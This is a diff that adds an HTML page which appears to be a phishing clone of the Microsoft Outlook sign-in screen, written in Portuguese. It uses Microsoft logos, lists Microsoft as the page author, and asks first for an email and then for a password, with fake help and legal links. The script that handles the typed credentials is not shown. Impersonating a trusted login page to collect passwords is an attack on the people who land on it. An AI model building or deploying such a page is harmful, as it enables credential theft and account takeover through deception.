@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang='pt-BR'>
+    <head>
+        <!-- 
+            ! description => Adicionar as discrição do WebSite.
+            ! author => Adicionar quem foi o desenvolvedor do WebSite.
+            ! robots => Gerar um arquivo que permitir os quais browsers que pode acessar o WebSite. [ E adicionar na raiz do WebSite ]
+            ? Gerar robots.txt : https://smallseotools.com/pt/robots-txt-generator/
+            ? Tudo sobre o robots.txt https://developers.google.com/search/docs/advanced/robots/create-robots-txt
+            ! canonical => Para unir o SEO da sua página em um determinado link. Caso seu site seja acessível via: www e sem www, vc pode optar por focar a indexação em apenas um deles.
+            ! sitemap => Gerar sitemap https://www.xml-sitemaps.com  [ E adicionar na raiz do WebSite ]
+            ! base => Pegar um base na Web pra pegar IMG ou outros arquivo.
+            ! stylesheet => Adicionar um styles do CSS na Pagina.
+            ! Gerar os metas tags pra Google e Facebook etc... [ https://metatags.io/ ]
+            ! Gerar os icon das Paginas.. [ https://www.favicon-generator.org/ ]
+        -->
+        <meta charset='UTF-8'>
+        <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+        <meta name='description' content='Conectar a Outlook'>
+        <meta name='author' content='Microsoft'>
+        <meta name='robots' content='index, follow' />
+        <meta name='title' content='Conectar a Outlook'>
+        <title>Conectar a Outlook</title>
+        <!-- <link rel='canonical' href='https://www.' /> -->
+        <!-- <link rel='sitemap' type='application/xml' href='sitemap.xml' /> -->
+        <link rel='base' href='' />
+        <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.5.2/css/all.css"
+        />
+        <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.5.2/css/sharp-thin.css"
+        />
+        <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.5.2/css/sharp-solid.css"
+        />
+        <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.5.2/css/sharp-regular.css"
+        />
+        <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.5.2/css/sharp-light.css"
+        />
+        <link rel='stylesheet' type='text/css' href='./assets/css/main.css'>
+        <link rel='shortcut icon' href='./assets/img/favicon.ico'>
+        <script type='module' src='./assets/js/script.js' defer></script>
+        <!-- <script type='text/javascript' src='' defer></script> -->
+    </head>
+    <body>
+        <section class="main">
+            <div class="container">
+                <div class="info">
+                    <div class="info-logo">
+                        <img src="./assets/img/logo.png" tabindex="-1">
+                    </div>
+                    <div class="info-main">
+                        <div class="main-logo">
+                            <img src="./assets/img/microsoft_logo.svg" tabindex="-1">
+                        </div>
+                        <div class="main-password">
+                            <h5 class="nicknames"></h5>
+                            <h6>Insira a senha</h6>
+                            <input type="password" name="password" id="password" placeholder="Senha" required>
+                            <h4>Esqueceu a senha?</h4>
+                            <h4>Outras maneiras de entrar</h4>
+                            <h4>Entrar com uma conta Microsoft diferente</h4>
+                            <div>
+                                <button class="main-login-user-submit">Entrar</button>
+                            </div>
+                        </div>
+                        <div class="main-login">
+                            <div class="main-login-title">
+                                <h3>Entrar</h3>
+                                <h4>Continuar para Outlook</h4>
+                            </div>
+                            <h3 class="display-erros">Não foi possível localizar uma conta com esse nome de usuário. Tente outra ou <span>obtenha uma nova conta da Microsoft.</span></h3>
+                            <input type="email" name="email" id="email"  placeholder="E-mail" required>
+                            <h5>Não tem uma conta? <span>Crie uma!</span></h5>
+                            <div class="main-login-input">
+                                <button class="next-email">Avançar</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="key-email">
+                    <i class="fa-light fa-key"></i>
+                    <h3>Opções de entrada</h3>
+                </div>
+            </div>
+        </section>
+        <section class="footer">
+            <a href="http://">Termos de uso</a>
+            <a href="http://">Privacidade e cookies</a>
+            <i class="fa-solid fa-ellipsis"></i>
+        </section>
+    </body>
+</html>
